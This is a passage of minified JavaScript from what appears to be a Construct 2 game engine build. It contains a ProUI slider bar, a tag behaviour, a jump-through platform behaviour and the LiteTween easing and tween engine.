objects."),this.isEnabled=this.properties[0],this.value=this.properties[1],this.sliderButtonUID=this.properties[2],this.minValue=this.properties[3],this.maxValue=this.properties[4],this.step=this.properties[5],this.firstFrame=!0,this.inst.uiType="sliderbar",this.uiType="sliderbar",(this.inst._proui=this).firstSetValue=!1,(this.compParent=this).isInit=!1,this.dpos={},this.onSliderTouchStarted=!1,this.onValueChanged=!1,this.value=this.validateValue(this.value)},e.getTemplate=function(){if(this.sliderButton=this.proui.tags[this.sliderButtonUID],this.sliderButton)return{sliderTag:this.sliderButtonUID,type:this.sliderButton.type,json:JSON.stringify(this.runtime.saveInstanceToJSON(this.sliderButton,!0))};console.error("SLIDERBAR %d : Slider button not found",this.inst.uid)},e.clone=function(t){var e,i;t&&((e=this.runtime.createInstance(t.type,this.inst.layer)).type.plugin.acts.LoadFromJsonString.call(e,t.json),i=t.sliderTag+this.proui.getIter(),e.aekiro_tag.tag=i,t=this.runtime.extra.notRegister,this.runtime.extra.notRegister=!1,this.proui.addTag(i,e),this.runtime.extra.notRegister=t,this.sliderButtonUID=i,this.init())},e.setValue=function(t){var e;this.firstSetValue=!0,this._setValue(t)&&((e=this.inst.proui_model)&&e.setModelValue(t,{except:this.compParent}),this.inst.proui_bind&&this.inst.proui_bind.updateGridViewModel(t,{except:this.compParent}))},e.validateValue=function(t){return t=this.proui.validateSimpleValue(t,0),t=Math.round(t/this.step)*this.step,t=cr.clamp(t,this.minValue,this.maxValue)},e._setValue=function(t){return null!=t&&(t=this.validateValue(t),this.value=t,this.updateView(),!0)},e.updateFromModel=function(){var t=this.inst.proui_model;!t||null!=(t=t.getFromModel())&&(t=this.validateValue(t),this.value=t)},e.OnAnyTouchStart=function(){this.sliderButton&&this.isInTouch(this.sliderButton)&&this.isEnabled&&(this.OnSliderTouchStart(),this.onSliderTouchStarted=!0,this.onValueChanged=!0)},e.OnTouchStart=function(){this.sliderButton&&this.isInTouch(this.sliderButton)||!this.isEnabled||(this.onX(this.proui.X(this.inst.layer.index)),this.onValueChanged=!0)},e.OnSliderTouchStart=function(){},e.OnAnyTouchEnd=function(t,e){this.onSliderTouchStarted&&this.OnTouchEnd(t,e),this.onSliderTouchStarted=!1,this.onValueChanged=!1},e.OnTouchEnd=function(t,e){this.setValue(this.value)},e.updateView=function(){this.isInit&&(this.inst.update_bbox(),this.sliderButton.x=cr.clamp(this.inst.bbox.left+(this.value-this.minValue)/this.step*this.widthStep,this.inst.bbox.left,this.inst.bbox.right),this.sliderButton.y=(this.inst.bbox.bottom+this.inst.bbox.top)/2,this.sliderButton.set_bbox_changed(),this.lastStop=this.sliderButton.x)},e.setEnabled=function(t){this.isEnabled=t},e.init=function(){this.isInit||(this.sliderButton=this.proui.tags[this.sliderButtonUID],this.sliderButton?(this.sliderButton.uiType="sliderbutton",this.inst.update_bbox(),this.sliderButton.x=this.inst.bbox.left,this.sliderButton.y=(this.inst.bbox.bottom+this.inst.bbox.top)/2,this.sliderButton.set_bbox_changed(),this.sliderButton.isSubComp=!0,this.widthStep=this.step/(this.maxValue-this.minValue)*this.inst.width,this.thres=this.step/(this.maxValue-this.minValue),this.lastStop=this.inst.bbox.left,this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y,this.dpos.dx=0,this.dpos.dy=0,this.isInit=!0):console.error("SLIDERBAR %d : Slider button not found",this.inst.uid))},e.onX=function(t){this.inst.update_bbox();var e=t-this.lastStop;.04<this.thres?0<this.sign(e)&&this.maxValue-this.value<this.step||Math.abs(e)>2*this.widthStep/3&&(this.lastStop=this.lastStop+this.sign(e)*this.widthStep,this.sliderButton.x=cr.clamp(this.lastStop,this.inst.bbox.left,this.inst.bbox.right),this.sliderButton.set_bbox_changed(),this.value=this.value+this.sign(e)*this.step,this.value=cr.clamp(this.value,this.minValue,this.maxValue)):(this.sliderButton.x=cr.clamp(t,this.inst.bbox.left,this.inst.bbox.right),this.sliderButton.set_bbox_changed(),this.value=(this.sliderButton.x-this.inst.bbox.left)/this.inst.width*(this.maxValue-this.minValue),this.value=this.minValue+Math.round(this.value/this.step)*this.step,this.value=cr.clamp(this.value,this.minValue,this.maxValue))},e.isInTouch=function(t){var e=this.proui.X(this.inst.layer.index),i=this.proui.Y(this.inst.layer.index);return t.update_bbox(),t.contains_pt(e,i)},e.sign=function(t){return isNaN(parseFloat(t))?NaN:0===t?0:-0===t?-0:0<t?1:-1},e.tick=function(){this.firstFrame&&(this.firstFrame=!1,this.init(),this.firstSetValue||this.updateFromModel(),this.updateView()),this.onSliderTouchStarted&&this.onX(this.proui.X(this.inst.layer.index))},e.updateChildren=function(){var t;this.sliderButton&&(isNaN(this.dpos.prev_x)&&(this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y),this.dpos.dx=this.inst.x-this.dpos.prev_x,this.dpos.dy=this.inst.y-this.dpos.prev_y,this.dpos.prev_x=this.inst.x,this.dpos.prev_y=this.inst.y,t=this.sliderButton,0==this.dpos.dx&&0==this.dpos.dy||(t.x+=this.dpos.dx,t.y+=this.dpos.dy,t.set_bbox_changed()))},e.tick2=function(){this.updateChildren()},e.onDestroy=function(){var t;this.runtime.changelayout||(this.proui.toBeDestroyed.push(this.sliderButton),t=this.proui,setTimeout(function(){t.clearDestroyList()},0))},e.saveToJSON=function(){return{isEnabled:this.isEnabled,value:this.value,minValue:this.minValue,maxValue:this.maxValue,step:this.step}},e.loadFromJSON=function(t){this.isEnabled=t.isEnabled,this.value=t.value,this.minValue=t.minValue,this.maxValue=t.maxValue,this.step=t.step},t.cnds=new i,i.prototype.IsSliding=function(){return this.onValueChanged},s.prototype.setValue=function(t){this.setValue(t)},t.acts=new s,n.prototype.value=function(t){t.set_float(this.value)},t.exps=new n}(),cr.behaviors.aekiro_tag=function(t){this.runtime=t},function(){var t=cr.behaviors.aekiro_tag.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){if(this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,!cr.proui)throw new Error("ProUI Plugin not found. Please add it to the project.")};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){this.proui=cr.proui,this.tag=this.properties[0],this.inst.proui_tag=this.tag,(this.inst.aekiro_tag=this).proui.addTag(this.tag,this.inst)},e.tick=function(){},e.onDestroy=function(){this.proui.removeTag(this.tag)},e.saveToJSON=function(){return{}},e.loadFromJSON=function(t){},i.prototype.IsTag=function(t){return t==this.tag},t.cnds=new i,t.acts=new function(){},s.prototype.tag=function(t){t.set_string(this.tag)},t.exps=new s}(),cr.behaviors.jumpthru=function(t){this.runtime=t},function(){var t=cr.behaviors.jumpthru.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime};var e=t.Instance.prototype;function i(){}function s(){}e.onCreate=function(){this.inst.extra.jumpthruEnabled=0!==this.properties[0]},e.tick=function(){},i.prototype.IsEnabled=function(){return this.inst.extra.jumpthruEnabled},t.cnds=new i,s.prototype.SetEnabled=function(t){this.inst.extra.jumpthruEnabled=!!t},t.acts=new s}();var easeOutBounceArray=[],easeInElasticArray=[],easeOutElasticArray=[],easeInOutElasticArray=[],easeInCircle=[],easeOutCircle=[],easeInOutCircle=[],easeInBack=[],easeOutBack=[],easeInOutBack=[],litetween_precision=1e4,updateLimit=0;function easeOutBouncefunc(t){return result=(t/=1)<1/2.75?7.5625*t*t*1+0:t<2/2.75?7.5625*(t-=1.5/2.75)*t+.75:t<2.5/2.75?7.5625*(t-=2.25/2.75)*t+.9375:7.5625*(t-=2.625/2.75)*t+.984375,result}function integerize(t,e){return Math.round(t/e*litetween_precision)}function easeFunc(t,e,i,s,n,r,o){var a,h,c,l,u=0;switch(t){case 0:u=s*e/n+i;break;case 1:u=s*(e/=n)*e+i;break;case 2:u=-s*(e/=n)*(e-2)+i;break;case 3:u=(e/=n/2)<1?s/2*e*e+i:-s/2*(--e*(e-2)-1)+i;break;case 4:u=s*(e/=n)*e*e+i;break;case 5:u=s*((e=e/n-1)*e*e+1)+i;break;case 6:u=(e/=n/2)<1?s/2*e*e*e+i:s/2*((e-=2)*e*e+2)+i;break;case 7:u=s*(e/=n)*e*e*e+i;break;case 8:u=-s*((e=e/n-1)*e*e*e-1)+i;break;case 9:u=(e/=n/2)<1?s/2*e*e*e*e+i:-s/2*((e-=2)*e*e*e-2)+i;break;case 10:u=s*(e/=n)*e*e*e*e+i;break;case 11:u=s*((e=e/n-1)*e*e*e*e+1)+i;break;case 12:u=(e/=n/2)<1?s/2*e*e*e*e*e+i:s/2*((e-=2)*e*e*e*e+2)+i;break;case 13:u=o.optimized?easeInCircle[integerize(e,n)]:-(Math.sqrt(1-e*e)-1);break;case 14:u=o.optimized?easeOutCircle[integerize(e,n)]:Math.sqrt(1-(e-1)*(e-1));break;case 15:u=o.optimized?easeInOutCircle[integerize(e,n)]:(e/=n/2)<1?-s/2*(Math.sqrt(1-e*e)-1)+i:s/2*(Math.sqrt(1-(e-=2)*e)+1)+i;break;case 16:u=o.optimized?easeInBack[integerize(e,n)]:s*(e/=n)*e*(((c=o.s)+1)*e-c)+i;break;case 17:u=o.optimized?easeOutBack[integerize(e,n)]:s*((e=e/n-1)*e*(((c=o.s)+1)*e+c)+1)+i;break;case 18:u=o.optimized?easeInOutBack[integerize(e,n)]:(c=o.s,(e/=n/2)<1?s/2*(e*e*((1+(c*=1.525))*e-c))+i:s/2*((e-=2)*e*((1+(c*=1.525))*e+c)+2)+i);break;case 19:u=o.optimized?easeInElasticArray[integerize(e,n)]:(a=o.a,(c=0)==e&&(u=i),1==(e/=n)&&(u=i+s),0==(h=o.p)&&(h=.3*n),c=0==a||a<Math.abs(s)?(a=s,h/4):h/(2*Math.PI)*Math.asin(s/a),-(a*Math.pow(2,10*--e)*Math.sin((e*n-c)*(2*Math.PI)/h))+i);break;case 20:u=o.optimized?easeOutElasticArray[integerize(e,n)]:(a=o.a,(c=0)==e&&(u=i),1==(e/=n)&&(u=i+s),0==(h=o.p)&&(h=.3*n),c=0==a||a<Math.abs(s)?(a=s,h/4):h/(2*Math.PI)*Math.asin(s/a),a*Math.pow(2,-10*e)*Math.sin((e*n-c)*(2*Math.PI)/h)+s+i);break;case 21:u=o.optimized?easeInOutElasticArray[integerize(e,n)]:(a=o.a,(c=0)==e&&(u=i),2==(e/=n/2)&&(u=i+s),0==(h=o.p)&&(h=n*(.3*1.5)),c=0==a||a<Math.abs(s)?(a=s,h/4):h/(2*Math.PI)*Math.asin(s/a),e<1?a*Math.pow(2,10*--e)*Math.sin((e*n-c)*(2*Math.PI)/h)*-.5+i:a*Math.pow(2,-10*--e)*Math.sin((e*n-c)*(2*Math.PI)/h)*.5+s+i);break;case 22:u=o.optimized?s-easeOutBounceArray[integerize(n-e,n)]+i:s-easeOutBouncefunc(n-e/n)+i;break;case 23:u=o.optimized?easeOutBounceArray[integerize(e,n)]:easeOutBouncefunc(e/n);break;case 24:u=o.optimized?e<n/2?.5*(s-easeOutBounceArray[integerize(n-2*e,n)]+i)+i:.5*easeOutBounceArray[integerize(2*e-n,n)]+.5*s+i:e<n/2?.5*(s-easeOutBouncefunc(n-2*e)+i)+i:.5*easeOutBouncefunc((2*e-n)/n)+.5*s+i;break;case 25:u=(l=e/n/2)*l*(3-2*l)*2;break;case 26:u=(l=(e/n+1)/2)*l*(3-2*l)*2-1;break;case 27:u=(l=e/n)*l*(3-2*l)}return r?s-i-u:u}!function(){for(var t=0,e=0,i=0,s=0,n=0,r=0;r<=litetween_precision;r++){s=r/litetween_precision,t=(s/=1)<1/2.75?7.5625*s*s*1+0:s<2/2.75?7.5625*(s-=1.5/2.75)*s+.75:s<2.5/2.75?7.5625*(s-=2.25/2.75)*s+.9375:7.5625*(s-=2.625/2.75)*s+.984375;easeOutBounceArray[r]=t,(i=e=0)==(s=r/litetween_precision)&&(t=0),1==(s/=1)&&(t=1),0==i&&(i=.3),n=0==e||e<Math.abs(1)?(e=1,i/4):i/(2*Math.PI)*Math.asin(1/e),t=0-e*Math.pow(2,10*--s)*Math.sin((+s-n)*(2*Math.PI)/i),easeInElasticArray[r]=t,(i=e=0)==(s=r/litetween_precision)&&(t=0),1==(s/=1)&&(t=1),0==i&&(i=.3),n=0==e||e<Math.abs(1)?(e=1,i/4):i/(2*Math.PI)*Math.asin(1/e),t=e*Math.pow(2,-10*s)*Math.sin((+s-n)*(2*Math.PI)/i)+1,easeOutElasticArray[r]=t,(i=e=0)==(s=r/litetween_precision)&&(t=0),2==(s/=.5)&&(t=1),0==i&&(i=.3*1.5*1),n=0==e||e<Math.abs(1)?(e=1,i/4):i/(2*Math.PI)*Math.asin(1/e),t=s<1?e*Math.pow(2,10*--s)*Math.sin((+s-n)*(2*Math.PI)/i)*-.5+0:e*Math.pow(2,-10*--s)*Math.sin((+s-n)*(2*Math.PI)/i)*.5+1,easeInOutElasticArray[r]=t,s=r/litetween_precision,easeInCircle[r]=-(Math.sqrt(1-s*s)-1),s=r/litetween_precision,easeOutCircle[r]=Math.sqrt(1-(s-1)*(s-1)),s=r/litetween_precision,t=(s/=.5)<1?-.5*(Math.sqrt(1-s*s)-1)+0:.5*(Math.sqrt(1-(s-=2)*s)+1)+0,easeInOutCircle[r]=t,s=r/litetween_precision,(n=0)==n&&(n=1.70158),t=(s/=1)*s*((n+1)*s-n)+0,easeInBack[r]=t,(n=0)==n&&(n=1.70158),t=(s=+(s=r/litetween_precision)-1)*s*((n+1)*s+n)+1,easeOutBack[r]=t,s=r/litetween_precision,(n=0)==n&&(n=1.70158),t=(s/=.5)<1?s*s*((1+(n*=1.525))*s-n)*.5+0:.5*((s-=2)*s*((1+(n*=1.525))*s+n)+2)+0,easeInOutBack[r]=t}}();var TweenObject=function(t,e,i,s,n,r,o){this.name=t,this.value=0,this.setInitial(s),this.setTarget(n),this.easefunc=i,this.tweened=e,this.duration=r,this.progress=0,this.state=0,this.onStart=!1,this.onEnd=!1,this.onReverseStart=!1,this.onReverseEnd=!1,this.lastKnownValue=0,this.lastKnownValue2=0,this.enforce=o,this.pingpong=1,this.flipEase=!1,this.easingparam=[],this.lastState=1;for(var a=0;a<28;a++)this.easingparam[a]={},this.easingparam[a].a=0,this.easingparam[a].p=0,this.easingparam[a].t=0,this.easingparam[a].s=0,this.easingparam[a].optimized=!0};function trim(t){return t.replace(/^\s\s*/,"").replace(/\s\s*$/,"")}function trim(t){return t.replace(/^\s\s*/,"").replace(/\s\s*$/,"")}TweenObject.prototype={},TweenObject.prototype.flipTarget=function(){var t=this.initialparam1,e=this.initialparam2;this.initialparam1=this.targetparam1,this.initialparam2=this.targetparam2,this.targetparam1=t,this.targetparam2=e,this.lastKnownValue=0,this.lastKnownValue2=0},TweenObject.prototype.setInitial=function(t){this.initialparam1=parseFloat(t.split(",")[0]),this.initialparam2=parseFloat(t.split(",")[1]),this.lastKnownValue=0,this.lastKnownValue2=0},TweenObject.prototype.setTarget=function(t){this.targetparam1=parseFloat(t.split(",")[0]),this.targetparam2=parseFloat(t.split(",")[1]),isNaN(this.targetparam2)&&(this.targetparam2=this.targetparam1)},TweenObject.prototype.OnTick=function(t){return 0===this.state?-1:(1===this.state&&(this.progress+=t),2===this.state&&(this.progress-=t),3===this.state&&(this.state=0),4!==this.state&&6!==this.state||(this.progress+=t*this.pingpong),5===this.state&&(this.progress+=t*this.pingpong),this.progress<0?(this.progress=0,4===this.state?this.pingpong=1:6===this.state?(this.pingpong=1,this.flipEase=!1):this.state=0,this.onReverseEnd=!0,0):this.progress>this.duration?(this.progress=this.duration,4===this.state?this.pingpong=-1:6===this.state?(this.pingpong=-1,this.flipEase=!0):5===this.state?this.progress=0:this.state=0,this.onEnd=!0,1):this.flipEase?easeFunc(this.easefunc,this.duration-this.progress,0,1,this.duration,this.flipEase,this.easingparam[this.easefunc]):easeFunc(this.easefunc,this.progress,0,1,this.duration,this.flipEase,this.easingparam[this.easefunc]))},cr.behaviors.lunarray_LiteTween=function(t){this.runtime=t},function(){var t=cr.behaviors.lunarray_LiteTween.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,this.i=0};var e=t.Instance.prototype;e.onCreate=function(){this.playmode=this.properties[0],this.active=1==this.playmode||2==this.playmode||3==this.playmode||4==this.playmode,this.tweened=this.properties[1],this.easing=this.properties[2],this.target=this.properties[3],this.targetmode=this.properties[4],this.useCurrent=!1,1===this.targetmode&&(this.target="relative("+this.target+")"),this.duration=this.properties[5],this.enforce=1===this.properties[6],this.value=0,this.tween_list={},this.addToTweenList("default",this.tweened,this.easing,"current",this.target,this.duration,this.enforce),1===this.properties[0]&&this.startTween(0),2===this.properties[0]&&this.startTween(2),3===this.properties[0]&&this.startTween(3),4===this.properties[0]&&this.startTween(4)},e.parseCurrent=function(t,e){void 0===e&&(e="current");var i=trim(e);e=trim(e);var s=this.value;if("current"===e)switch(t){case 0:i=this.inst.x+","+this.inst.y;break;case 1:case 2:case 3:i=this.inst.width+","+this.inst.height;break;case 4:i=cr.to_degrees(this.inst.angle)+","+cr.to_degrees(this.inst.angle);break;case 5:i=100*this.inst.opacity+","+100*this.inst.opacity;break;case 6:i=s+","+s;break;case 7:case 8:i=this.inst.x+","+this.inst.y;break;case 9:i=void 0!==this.inst.curFrame?this.inst.width/this.inst.curFrame.width+","+this.inst.height/this.inst.curFrame.height:"1,1"}if("relative"===e.substring(0,8)){var n,r,e=e.match(/\((.*?)\)/);switch(e&&(n=parseFloat(e[1].split(",")[0]),r=parseFloat(e[1].split(",")[1])),isNaN(n)&&(n=0),isNaN(r)&&(r=0),t){case 0:i=this.inst.x+n+","+(this.inst.y+r);break;case 1:case 2:case 3:i=this.inst.width+n+","+(this.inst.height+r);break;case 4:i=cr.to_degrees(this.inst.angle)+n+","+(cr.to_degrees(this.inst.angle)+r);break;case 5:i=100*this.inst.opacity+n+","+(100*this.inst.opacity+r);break;case 6:i=s+n+","+s+n;break;case 7:i=this.inst.x+n+","+this.inst.y;break;case 8:i=this.inst.x+","+(this.inst.y+n);break;case 9:i=n+","+r}}return i},e.addToTweenList=function(t,e,i,s,n,r,o){s=this.parseCurrent(e,s),n=this.parseCurrent(e,n),void 0!==this.tween_list[t]&&delete this.tween_list[t],this.tween_list[t]=new TweenObject(t,e,i,s,n,r,o),this.tween_list[t].dt=0},e.saveToJSON=function(){JSON.stringify(this.tween_list.default);return{playmode:this.playmode,active:this.active,tweened:this.tweened,easing:this.easing,target:this.target,targetmode:this.targetmode,useCurrent:this.useCurrent,duration:this.duration,enforce:this.enforce,value:this.value,tweenlist:JSON.stringify(this.tween_list.default)}},TweenObject.Load=function(t,e,i,s,n,r,o,a){var h,c=new TweenObject(e,i,s,n,r,o,a);for(h in t)c[h]=t[h];return c},e.loadFromJSON=function(t){var e=JSON.parse(t.tweenlist),e=TweenObject.Load(e,e.name,e.tweened,e.easefunc,e.initialparam1+","+e.initialparam2,e.targetparam1+","+e.targetparam2,e.duration,e.enforce);this.tween_list.default=e,this.playmode=t.playmode,this.active=t.active,this.movement=t.tweened,this.easing=t.easing,this.target=t.target,this.targetmode=t.targetmode,this.useCurrent=t.useCurrent,this.duration=t.duration,this.enforce=t.enforce,this.value=t.value},e.setProgressTo=function(t){for(var e in 1<t&&(t=1),t<0&&(t=0),this.tween_list){var i=this.tween_list[e];i.lastKnownValue=0,i.lastKnownValue2=0,i.state=3,i.progress=t*i.duration;var s=i.OnTick(0);this.updateTween(i,s)}},e.startTween=function(t){for(var e in this.tween_list){var i,s,n=this.tween_list[e];this.useCurrent&&(i=this.parseCurrent(n.tweened,"current"),s=this.parseCurrent(n.tweened,this.target),n.setInitial(i),n.setTarget(s)),0===t&&(n.progress=1e-6,n.lastKnownValue=0,n.lastKnownValue2=0,n.onStart=!0,n.state=1),1===t&&(n.state=n.lastState),2!==t&&4!==t||(n.progress=1e-6,n.lastKnownValue=0,n.lastKnownValue2=0,n.onStart=!0,2==t&&(n.state=4),4==t&&(n.state=6)),3===t&&(n.progress=1e-6,n.lastKnownValue=0,n.lastKnownValue2=0,n.onStart=!0,n.state=5)}},e.stopTween=function(t){for(var e in this.tween_list){var i=this.tween_list[e];3!=i.state&&0!=i.state&&(i.lastState=i.state),1===t&&(i.progress=0),2===t&&(i.progress=i.duration),i.state=3;var s=i.OnTick(0);this.updateTween(i,s)}},e.reverseTween=function(t){for(var e in this.tween_list){var i=this.tween_list[e];1===t&&(i.progress=i.duration,i.lastKnownValue=0,i.lastKnownValue2=0,i.onReverseStart=!0),i.state=2}},e.updateTween=function(t,e){var i,s;0===t.tweened?t.enforce?(this.inst.x=t.initialparam1+(t.targetparam1-t.initialparam1)*e,this.inst.y=t.initialparam2+(t.targetparam2-t.initialparam2)*e):(this.inst.x+=(t.targetparam1-t.initialparam1)*e-t.lastKnownValue,this.inst.y+=(t.targetparam2-t.initialparam2)*e-t.lastKnownValue2,t.lastKnownValue=(t.targetparam1-t.initialparam1)*e,t.lastKnownValue2=(t.targetparam2-t.initialparam2)*e):1===t.tweened?t.enforce?(this.inst.width=t.initialparam1+(t.targetparam1-t.initialparam1)*e,this.inst.height=t.initialparam2+(t.targetparam2-t.initialparam2)*e):(this.inst.width+=(t.targetparam1-t.initialparam1)*e-t.lastKnownValue,this.inst.height+=(t.targetparam2-t.initialparam2)*e-t.lastKnownValue2,t.lastKnownValue=(t.targetparam1-t.initialparam1)*e,t.lastKnownValue2=(t.targetparam2-t.initialparam2)*e):2===t.tweened?t.enforce?this.inst.width=t.initialparam1+(t.targetparam1-t.initialparam1)*e:(this.inst.width+=(t.targetparam1-t.initialparam1)*e-t.lastKnownValue,t.lastKnownValue=(t.targetparam1-t.initialparam1)*e):3===t.tweened?t.enforce?this.inst.height=t.initialparam2+(t.targetparam2-t.initialparam2)*e:(this.inst.height+=(t.targetparam2-t.initialparam2)*e-t.lastKnownValue2,t.lastKnownValue2=(t.targetparam2-t.initialparam2)*e):4===t.tweened?t.enforce?(s=t.initialparam1+(t.targetparam1-t.initialparam1)*e,this.inst.angle=cr.clamp_angle(cr.to_radians(s))):(s=(t.targetparam1-t.initialparam1)*e-t.lastKnownValue,this.inst.angle=cr.clamp_angle(this.inst.angle+cr.to_radians(s)),t.lastKnownValue=(t.targetparam1-t.initialparam1)*e):5===t.tweened?t.enforce?this.inst.opacity=(t.initialparam1+(t.targetparam1-t.initialparam1)*e)/100:(this.inst.opacity+=((t.targetparam1-t.initialparam1)*e-t.lastKnownValue)/100,t.lastKnownValue=(t.targetparam1-t.initialparam1)*e):6===t.tweened?t.enforce?this.value=t.initialparam1+(t.targetparam1-t.initialparam1)*e:(this.value+=(t.targetparam1-t.initialparam1)*e-t.lastKnownValue,t.lastKnownValue=(t.targetparam1-t.initialparam1)*e):7===t.tweened?t.enforce?this.inst.x=t.initialparam1+(t.targetparam1-t.initialparam1)*e:(this.inst.x+=(t.targetparam1-t.initialparam1)*e-t.lastKnownValue,t.lastKnownValue=(t.targetparam1-t.initialparam1)*e):8===t.tweened?t.enforce?this.inst.y=t.initialparam2+(t.targetparam2-t.initialparam2)*e:(this.inst.y+=(t.targetparam2-t.initialparam2)*e-t.lastKnownValue2,t.lastKnownValue2=(t.targetparam2-t.initialparam2)*e):9===t.tweened&&(i=t.initialparam1+(t.targetparam1-t.initialparam1)*e,s=t.initialparam2+(t.targetparam2-t.initialparam2)*e,this.inst.width<0&&(i=t.initialparam1+(t.targetparam1+t.initialparam1)*-e),this.inst.height<0&&(s=t.initialparam2+(t.targetparam2+t.initialparam2)*-e),t.enforce?(this.inst.width=this.inst.curFrame.width*i,this.inst.height=this.inst.curFrame.height*s):(this.inst.width<0?(this.inst.width=i*(this.inst.width/(-1+t.lastKnownValue)),t.lastKnownValue=i+1):(this.inst.width=i*(this.inst.width/(1+t.lastKnownValue)),t.lastKnownValue=i-1),this.inst.height<0?(this.inst.height=s*(this.inst.height/(-1+t.lastKnownValue2)),t.lastKnownValue2=s+1):(this.inst.height=s*(this.inst.height/(1+t.lastKnownValue2)),t.lastKnownValue2=s-1))),this.inst.set_bbox_changed()},e.tick=function(){var t=this.runtime.getDt(this.inst),e=this.tween_list.default;0!==e.state&&(e.onStart&&(this.runtime.trigger(cr.behaviors.lunarray_LiteTween.prototype.cnds.OnStart,this.inst),e.onStart=!1),e.onReverseStart&&(this.runtime.trigger(cr.behaviors.lunarray_LiteTween.prototype.cnds.OnReverseStart,this.inst),e.onReverseStart=!1),this.active=1==e.state||2==e.state||4==e.state||5==e.state||6==e.state,t=e.OnTick(t),this.updateTween(e,t),e.onEnd&&(this.runtime.trigger(cr.behaviors.lunarray_LiteTween.prototype.cnds.OnEnd,this.inst),e.onEnd=!1),e.onReverseEnd&&(this.runtime.trigger(cr.behaviors.lunarray_LiteTween.prototype.cnds.OnReverseEnd,this.inst),e.onReverseEnd=!1))},t.cnds={},(e=t.cnds).IsActive=function(){return 0!==this.tween_list.default.state},e.IsReversing=function(){return 2==this.tween_list.default.state},e.CompareProgress=function(t,e){var i=this.tween_list.default;return cr.do_cmp(i.progress/i.duration,t,e)},e.OnThreshold=function(t,e){var i=this.tween_list.default;this.threshold=cr.do_cmp(i.progress/i.duration,t,e);e=this.oldthreshold!=this.threshold&&this.threshold;return e&&(this.oldthreshold=this.threshold),e},e.OnStart=function(){return void 0!==this.tween_list.default&&this.tween_list.default.onStart},e.OnReverseStart=function(){return void 0!==this.tween_list.default&&this.tween_list.default.onReverseStart},e.OnEnd=function(){return void 0!==this.tween_list.default&&this.tween_list.default.onEnd},e.OnReverseEnd=function(){return void 0!==this.tween_list.default&&this.tween_list.default.onReverseEnd},t.acts={},(e=t.acts).Start=function(t,e){this.threshold=!1,this.oldthreshold=!1,this.useCurrent=1==e,this.startTween(t)},e.Stop=function(t){this.stopTween(t)},e.Reverse=function(t){this.threshold=!1,this.oldthreshold=!1,this.reverseTween(t)},e.ProgressTo=function(t){this.setProgressTo(t)},e.SetDuration=function(t){isNaN(t)||t<0||void 0!==this.tween_list.default&&(this.tween_list.default.duration=t)},e.SetEnforce=function(t){void 0!==this.tween_list.default&&(this.tween_list.default.enforce=1===t)},e.SetInitial=function(t){void 0!==this.tween_list.default&&(t=this.parseCurrent(this.tween_list.default.tweened,t),this.tween_list.default.setInitial(t))},e.SetTarget=function(t,e,i){if(void 0!==this.tween_list.default&&!isNaN(i)){var s=this.tween_list.default,n=i+"",r="",o="";if(1===(this.targetmode=e)){switch(this.target="relative("+n+")",t){case 0:r=this.inst.x+i,o=s.targetparam2;break;case 1:r=s.targetparam1,o=this.inst.y+i;break;case 2:o=r=""+cr.to_degrees(this.inst.angle+cr.to_radians(i));break;case 3:o=r=""+100*this.inst.opacity+i;break;case 4:r=this.inst.width+i,o=s.targetparam2;break;case 5:r=s.targetparam1,o=this.inst.height+i;break;case 6:o=r=i}n=r+","+o}else{switch(t){case 0:r=i,o=s.targetparam2;break;case 1:r=s.targetparam1,o=i;break;case 2:case 3:o=r=i;break;case 4:r=i,o=s.targetparam2;break;case 5:r=s.targetparam1,o=i;break;case 6:o=r=i}n=r+","+o,this.target=n}t=this.parseCurrent(this.tween_list.default.tweened,"current"),n=this.parseCurrent(this.tween_list.default.tweened,n);s.setInitial(t),s.setTarget(n)}},e.SetTweenedProperty=function(t){void 0!==this.tween_list.default&&(this.tween_list.default.tweened=t)},e.SetEasing=function(t){void 0!==this.tween_list.default&&(this.tween_list.default.easefunc=t)},e.SetEasingParam=function(t,e,i,s,n){void 0!==this.tween_list.default&&(this.tween_list.default.easingparam[t].optimized=!1,this.tween_list.default.easingparam[t].a=e,this.tween_list.default.easingparam[t].p=i,this.tween_list.default.easingparam[t].t=s,this.tween_list.default.easingparam[t].s=n)},e.ResetEasingParam=function(){void 0!==this.tween_list.default&&(this.tween_list.default.optimized=!0)},e.SetValue=function(t){var e=this.tween_list.default;this.value=t,6===e.tweened&&e.setInitial(this.parseCurrent(e.tweened,"current"))},e.SetParameter=function(t,e,i,s,n){var r;void 0===this.tween_list.default?this.addToTweenList("default",t,e,initial,i,s,n,0):((r=this.tween_list.default).tweened=t,r.easefunc=e,r.setInitial(this.parseCurrent(t,"current")),r.setTarget(this.parseCurrent(t,i)),r.duration=s,r.enforce=1===n)},t.exps={},(t=t.exps).State=function(t){var e="N/A";switch(this.tween_list.default.state){case 0:e="paused";break;case 1:e="playing";break;case 2:e="reversing";break;case 3:e="seeking"}t.set_string(e)},t.Progress=function(t){var e=this.tween_list.default.progress/this.tween_list.default.duration;t.set_float(e)},t.Duration=function(t){t.set_float(this.tween_list.default.duration)},t.Target=function(t){var e=this.tween_list.default,i="N/A";switch(e.tweened){case 0:i=e.targetparam1;break;case 1:i=e.targetparam2;break;case 2:case 3:case 4:i=e.targetparam1;break;case 5:i=e.targetparam2;break;case 6:i=e.targetparam1}t.set_float(i)},t.Value=function(t){var e=this.value;t.set_float(e)},t.Tween=function(t,e,i,s,n){s=1<s?1:s,s=easeFunc(n,s<0?0:s,0,1,1,!1,!1);t.set_float(e+s*(i-e))}}(),cr.behaviors.lunarray_Tween=function(t){this.runtime=t},function(){var t=cr.behaviors.lunarray_Tween.prototype;t.Type=function(t,e){this.behavior=t,this.objtype=e,this.runtime=t.runtime},t.Type.prototype.onCreate=function(){},t.Instance=function(t,e){this.type=t,this.behavior=t.behavior,this.inst=e,this.runtime=t.runtime,this.i=0};var e=t.Instance.prototype;function 